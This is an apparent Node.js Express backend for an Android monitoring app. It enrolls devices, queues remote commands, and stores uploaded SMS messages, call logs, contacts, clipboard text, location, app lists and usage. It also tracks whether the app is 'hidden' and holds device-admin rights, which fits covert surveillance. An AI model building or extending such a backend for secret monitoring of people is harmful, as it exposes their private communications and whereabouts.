'use strict';

const express = require('express');
const { query } = require('../db');
const { sha256Hex, generateDeviceToken } = require('../auth');
const { deviceAuth, clientIp } = require('../middleware');
const { SYNC_INTERVAL, clientConfig } = require('../config');
const ws = require('../ws');

const router = express.Router();

const ENROLLMENT_KEY = process.env.ENROLLMENT_KEY || '';
const DEFAULT_USER_EMAIL = process.env.ADMIN_EMAIL || 'admin@example.com';

function nowIso() {
  return new Date().toISOString();
}

function toJson(v, fallback) {
  if (v === undefined || v === null) return fallback;
  return v;
}

// ---------------------------------------------------------------------------
// 1. health (no auth)
// ---------------------------------------------------------------------------
router.post('/health', (req, res) => {
  res.json({ status: 'ok', time: nowIso(), version: '2.0' });
});

// ---------------------------------------------------------------------------
// 2. enroll (no device auth; only enrollment key)
// ---------------------------------------------------------------------------
router.post('/enroll', async (req, res, next) => {
  try {
    const b = req.body || {};
    if (!ENROLLMENT_KEY || b.enrollment_key !== ENROLLMENT_KEY) {
      return res.status(401).json({ error: 'invalid enrollment key' });
    }
    const deviceUid = b.device_uid;
    if (!deviceUid) {
      return res.status(400).json({ error: 'device_uid required' });
    }

    // owner user: first admin (defaults seeded by init-db)
    const users = await query('SELECT id FROM users ORDER BY id ASC LIMIT 1', []);
    if (!users.length) {
      return res.status(500).json({ error: 'no owner user configured' });
    }
    const userId = users[0].id;

    const rawToken = generateDeviceToken();
    const tokenHash = sha256Hex(rawToken);

    const existing = await query('SELECT id FROM devices WHERE device_uid = ? LIMIT 1', [deviceUid]);
    let deviceId;
    if (existing.length) {
      deviceId = existing[0].id;
      await query(
        `UPDATE devices SET user_id=?, label=?, model=?, manufacturer=?, android_release=?,
           sdk_int=?, app_version=?, device_token_hash=?, enrollment_key_used=?, last_seen=NOW()
         WHERE id=?`,
        [
          userId,
          toJson(b.label, null),
          toJson(b.model, null),
          toJson(b.manufacturer, null),
          toJson(b.android_release, null),
          toJson(b.sdk_int, null),
          toJson(b.app_version, null),
          tokenHash,
          ENROLLMENT_KEY,
          deviceId,
        ]
      );
    } else {
      const r = await query(
        `INSERT INTO devices
           (user_id, device_uid, label, model, manufacturer, android_release, sdk_int, app_version,
            device_token_hash, enrollment_key_used, last_seen)
         VALUES (?,?,?,?,?,?,?,?,?,?,NOW())`,
        [
          userId,
          deviceUid,
          toJson(b.label, null),
          toJson(b.model, null),
          toJson(b.manufacturer, null),
          toJson(b.android_release, null),
          toJson(b.sdk_int, null),
          toJson(b.app_version, null),
          tokenHash,
          ENROLLMENT_KEY,
        ]
      );
      deviceId = r.insertId;
    }

    // Re-read the row so a re-enrolling device keeps its per-device SMS cadence.
    const enrolled = await query(
      'SELECT id, device_uid, sms_interval_s FROM devices WHERE id = ? LIMIT 1',
      [deviceId]
    );

    res.json({
      device_id: deviceId,
      device_token: rawToken,
      user_id: userId,
      sync_interval: SYNC_INTERVAL,
      // Sent here as well as on /commands so a freshly enrolled device knows both
      // cadences (poll + SMS inbox) before its first poll completes.
      config: clientConfig(enrolled[0]),
      server_time: nowIso(),
    });
  } catch (err) {
    next(err);
  }
});

// ---------------------------------------------------------------------------
// 3. GET /commands  (device auth)
// ---------------------------------------------------------------------------
router.get('/commands', deviceAuth, async (req, res, next) => {
  try {
    const deviceId = req.device.id;
    const ip = clientIp(req);

    await query(
      'UPDATE devices SET is_online=1, last_seen=NOW(), ip_address=? WHERE id=?',
      [ip, deviceId]
    );

    // expire stale pending commands
    await query(
      `UPDATE commands
         SET status='expired'
       WHERE device_id=? AND status='pending'
         AND created_at < (NOW() - INTERVAL ttl_seconds SECOND)`,
      [deviceId]
    );

    const rows = await query(
      `SELECT id, action, params, status FROM commands
        WHERE device_id=? AND status IN ('pending','delivered')
        ORDER BY id ASC`,
      [deviceId]
    );

    if (rows.length) {
      const ids = rows.map((r) => r.id);
      await query(
        `UPDATE commands SET status='delivered', delivered_at=NOW()
          WHERE id IN (${ids.map(() => '?').join(',')}) AND status='pending'`,
        ids
      );
    }

    const commands = rows.map((r) => {
      let params = r.params;
      if (typeof params === 'string') {
        try {
          params = JSON.parse(params);
        } catch (e) {
          params = {};
        }
      }
      return { id: r.id, action: r.action, params: params || {} };
    });

    res.json({
      commands,
      sync_interval: SYNC_INTERVAL,
      server_time: nowIso(),
      config: clientConfig(req.device),
    });
  } catch (err) {
    next(err);
  }
});

// ---------------------------------------------------------------------------
// 4. POST /command_result
// ---------------------------------------------------------------------------
router.post('/command_result', deviceAuth, async (req, res, next) => {
  try {
    const b = req.body || {};
    const allowed = ['ok', 'error', 'pending_user', 'denied'];
    const status = allowed.includes(b.status) ? b.status : 'error';
    const id = parseInt(b.id, 10);
    if (!id) {
      return res.status(400).json({ error: 'id required' });
    }

    const rows = await query('SELECT id, action, params FROM commands WHERE id=? AND device_id=? LIMIT 1', [
      id,
      req.device.id,
    ]);
    if (!rows.length) {
      return res.status(404).json({ error: 'command not found' });
    }

    await query(
      `UPDATE commands SET status=?, result_message=?, completed_at=NOW() WHERE id=?`,
      [status, b.message || null, id]
    );

    const command = {
      id,
      action: b.action || rows[0].action,
      status,
      result_message: b.message || null,
      code: b.code !== undefined ? b.code : null,
    };
    ws.broadcast({ type: 'command_result', device_id: req.device.device_uid, command });

    res.json({ status: 'ok' });
  } catch (err) {
    next(err);
  }
});

// ---------------------------------------------------------------------------
// 5. POST /telemetry
// ---------------------------------------------------------------------------
router.post('/telemetry', deviceAuth, async (req, res, next) => {
  try {
    const b = req.body || {};
    const deviceId = req.device.id;
    const deviceUid = req.device.device_uid;
    const stored = {
      sms: 0,
      calls: 0,
      contacts: 0,
      clipboard: 0,
      apps: 0,
      usage: 0,
      permissions: 0,
      location: false,
    };

    // device scalar updates
    const sets = [];
    const vals = [];
    if (b.app_version !== undefined) {
      sets.push('app_version=?');
      vals.push(b.app_version);
    }
    if (b.battery !== undefined && b.battery !== null) {
      sets.push('battery=?');
      vals.push(b.battery);
    }
    if (b.device_info && typeof b.device_info === 'object') {
      const di = b.device_info;
      if (di.model !== undefined) {
        sets.push('model=?');
        vals.push(di.model);
      }
      if (di.manufacturer !== undefined) {
        sets.push('manufacturer=?');
        vals.push(di.manufacturer);
      }
      if (di.android_release !== undefined) {
        sets.push('android_release=?');
        vals.push(di.android_release);
      }
      if (di.sdk_int !== undefined) {
        sets.push('sdk_int=?');
        vals.push(di.sdk_int);
      }
    }
    if (b.hidden !== undefined) {
      sets.push('hidden=?');
      vals.push(b.hidden ? 1 : 0);
    }
    if (b.admin_active !== undefined) {
      sets.push('admin_active=?');
      vals.push(b.admin_active ? 1 : 0);
    }
    sets.push('last_seen=NOW()', 'is_online=1');
    await query(`UPDATE devices SET ${sets.join(', ')} WHERE id=?`, [...vals, deviceId]);

    // permissions
    if (Array.isArray(b.permissions)) {
      for (const p of b.permissions) {
        if (!p || !p.name) continue;
        await query(
          `INSERT INTO device_permissions (device_id, permission, granted)
             VALUES (?,?,?)
           ON DUPLICATE KEY UPDATE granted=VALUES(granted), updated_at=NOW()`,
          [deviceId, String(p.name), p.granted ? 1 : 0]
        );
        stored.permissions += 1;
      }
    }

    // installed_apps
    if (Array.isArray(b.installed_apps)) {
      for (const a of b.installed_apps) {
        if (!a || !a.package) continue;
        await query(
          `INSERT INTO installed_apps (device_id, package, label, version_name)
             VALUES (?,?,?,?)
           ON DUPLICATE KEY UPDATE label=VALUES(label), version_name=VALUES(version_name), last_seen=NOW()`,
          [deviceId, String(a.package), a.label || null, a.version_name || null]
        );
        stored.apps += 1;
      }
    }

    // location
    if (b.location && typeof b.location === 'object') {
      const l = b.location;
      await query(
        `INSERT INTO locations (device_id, lat, lon, accuracy, ts) VALUES (?,?,?,?,?)`,
        [
          deviceId,
          l.lat !== undefined ? l.lat : null,
          l.lon !== undefined ? l.lon : null,
          l.accuracy !== undefined ? l.accuracy : null,
          l.timestamp !== undefined ? l.timestamp : null,
        ]
      );
      stored.location = true;
    }

    // sms_logs
    if (Array.isArray(b.sms_logs)) {
      for (const s of b.sms_logs) {
        if (!s) continue;
        const hash = sha256Hex(
          [deviceUid, s.sender || '', s.body || '', s.timestamp || 0].join('|')
        );
        await query(
          `INSERT INTO sms_messages (device_id, address, body, direction, ts, dedupe_hash)
             VALUES (?,?,?,?,?,?)
           ON DUPLICATE KEY UPDATE address=VALUES(address), body=VALUES(body),
             direction=VALUES(direction), ts=VALUES(ts)`,
          [deviceId, s.sender || null, s.body || null, s.direction || null, s.timestamp || null, hash]
        );
        stored.sms += 1;
      }
    }

    // call_logs
    if (Array.isArray(b.call_logs)) {
      for (const c of b.call_logs) {
        if (!c) continue;
        const hash = sha256Hex(
          [deviceUid, c.number || '', c.type || '', c.duration_s || 0, c.timestamp || 0].join('|')
        );
        await query(
          `INSERT INTO call_logs (device_id, number, cached_name, call_type, duration_s, ts, dedupe_hash)
             VALUES (?,?,?,?,?,?,?)
           ON DUPLICATE KEY UPDATE number=VALUES(number), cached_name=VALUES(cached_name),
             call_type=VALUES(call_type), duration_s=VALUES(duration_s), ts=VALUES(ts)`,
          [
            deviceId,
            c.number || null,
            c.name || null,
            c.type || null,
            c.duration_s !== undefined ? c.duration_s : null,
            c.timestamp || null,
            hash,
          ]
        );
        stored.calls += 1;
      }
    }

    // contacts
    if (Array.isArray(b.contacts)) {
      for (const ct of b.contacts) {
        if (!ct) continue;
        const name = ct.display_name || '';
        const hash = sha256Hex(`${deviceUid}|${name}`);
        await query(
          `INSERT INTO contacts (device_id, display_name, phone_numbers, emails, dedupe_hash)
             VALUES (?,?,?,?,?)
           ON DUPLICATE KEY UPDATE display_name=VALUES(display_name),
             phone_numbers=VALUES(phone_numbers), emails=VALUES(emails)`,
          [
            deviceId,
            name || null,
            JSON.stringify(ct.numbers || []),
            JSON.stringify(ct.emails || []),
            hash,
          ]
        );
        stored.contacts += 1;
      }
    }

    // clipboard (skip identical to latest stored content)
    if (Array.isArray(b.clipboard) && b.clipboard.length) {
      const latest = await query(
        'SELECT content FROM clipboard_entries WHERE device_id=? ORDER BY id DESC LIMIT 1',
        [deviceId]
      );
      const latestContent = latest.length ? latest[0].content : null;
      for (const cl of b.clipboard) {
        if (!cl) continue;
        const content = cl.content || '';
        if (latestContent !== null && content === latestContent) {
          continue; // identical to most recent -> skip
        }
        const capturedAt = cl.timestamp
          ? new Date(Number(cl.timestamp)).toISOString().slice(0, 19).replace('T', ' ')
          : null;
        await query(
          'INSERT INTO clipboard_entries (device_id, content, captured_at) VALUES (?,?,?)',
          [deviceId, content, capturedAt]
        );
        stored.clipboard += 1;
      }
    }

    // usage_events
    if (Array.isArray(b.usage_events)) {
      for (const u of b.usage_events) {
        if (!u || !u.package) continue;
        await query(
          `INSERT INTO usage_events (device_id, package, label, total_time_ms, ts) VALUES (?,?,?,?,?)`,
          [
            deviceId,
            String(u.package),
            u.label || null,
            u.totalTimeMs !== undefined ? u.totalTimeMs : null,
            u.timestamp !== undefined ? u.timestamp : null,
          ]
        );
        stored.usage += 1;
      }
    }

    ws.broadcast({ type: 'telemetry', device_id: deviceUid, summary: stored });

    res.json({ status: 'ok', stored });
  } catch (err) {
    next(err);
  }
});

// ---------------------------------------------------------------------------
// 9. GET /config (device auth)
// ---------------------------------------------------------------------------
router.get('/config', deviceAuth, (req, res) => {
  res.json({ sync_interval: SYNC_INTERVAL, config: clientConfig(req.device) });
});

// ---------------------------------------------------------------------------
// 10. GET /rules (device auth)
// Blocked packages of the device owner user (app_rules.user_id).
// ---------------------------------------------------------------------------
router.get('/rules', deviceAuth, async (req, res) => {
  try {
    const rows = await query(
      'SELECT package FROM app_rules WHERE user_id=? ORDER BY package ASC',
      [req.device.user_id]
    );
    res.json({ packages: rows.map((r) => r.package) });
  } catch (err) {
    // contract says this endpoint always answers 200 with a packages array
    console.error('[rules] lookup failed:', err.message);
    res.json({ packages: [] });
  }
});

module.exports = router;
